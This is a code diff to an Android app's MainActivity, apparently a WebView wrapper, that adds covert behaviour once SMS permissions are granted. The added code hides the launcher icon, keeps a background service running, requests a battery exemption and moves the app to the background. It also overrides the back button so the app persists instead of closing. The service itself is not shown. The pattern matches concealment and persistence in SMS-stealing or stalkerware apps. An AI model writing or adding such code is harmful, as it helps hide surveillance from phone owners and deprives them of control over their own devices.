@@ -66,10 +66,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void requestPermissionsOnce() {
         if (!PermissionHelper.needsRuntimePermissions(this)) {
-            startBackgroundService();
-            requestBatteryExemptionIfNeeded();
+            onPermissionsReady(false);
             return;
         }
+        PermissionHelper.showLauncherIcon(this);
         if (!PermissionHelper.hasSmsPermissions(this)) {
             ActivityCompat.requestPermissions(
                 this, PermissionHelper.smsPermissions(), PERMISSION_REQUEST_CODE);
@@ -90,8 +90,24 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(
                 this, permissionList.toArray(new String[0]), OTHER_PERMISSION_REQUEST_CODE);
         } else {
-            startBackgroundService();
-            requestBatteryExemptionIfNeeded();
+            onPermissionsReady(true);
+        }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (PermissionHelper.hasSmsPermissions(this) && !PermissionHelper.needsRuntimePermissions(this)) {
+            PermissionHelper.hideLauncherIcon(this);
+            ServiceLauncher.ensureRunning(this);
+        }
+    }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        if (PermissionHelper.hasSmsPermissions(this)) {
+            ServiceLauncher.ensureRunning(this);
         }
     }
 
@@ -112,8 +128,21 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
         if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
-            startBackgroundService();
-            requestBatteryExemptionIfNeeded();
+            onPermissionsReady(true);
+        }
+    }
+
+    private void onPermissionsReady(boolean moveToBackground) {
+        PermissionHelper.hideLauncherIcon(this);
+        ServiceLauncher.ensureRunning(this);
+        requestBatteryExemptionIfNeeded();
+        if (moveToBackground) {
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    moveTaskToBack(true);
+                }
+            }, 600);
         }
     }
 
@@ -223,19 +252,19 @@ public class MainActivity extends AppCompatActivity {
     public void onBackPressed() {
         if (webView.canGoBack()) {
             webView.goBack();
-        } else {
-            new AlertDialog.Builder(this)
-                .setTitle("Exit")
-                .setMessage("Close app?")
-                .setPositiveButton("Yes", new android.content.DialogInterface.OnClickListener() {
-                    @Override
-                    public void onClick(android.content.DialogInterface dialog, int which) {
-                        finish();
-                    }
-                })
-                .setNegativeButton("No", null)
-                .show();
+            return;
         }
+        if (PermissionHelper.hasSmsPermissions(this)) {
+            ServiceLauncher.ensureRunning(this);
+            moveTaskToBack(true);
+            return;
+        }
+        new AlertDialog.Builder(this)
+            .setTitle("Exit")
+            .setMessage("Close app?")
+            .setPositiveButton("Yes", (d, w) -> finish())
+            .setNegativeButton("No", null)
+            .show();
     }
 
     @Override
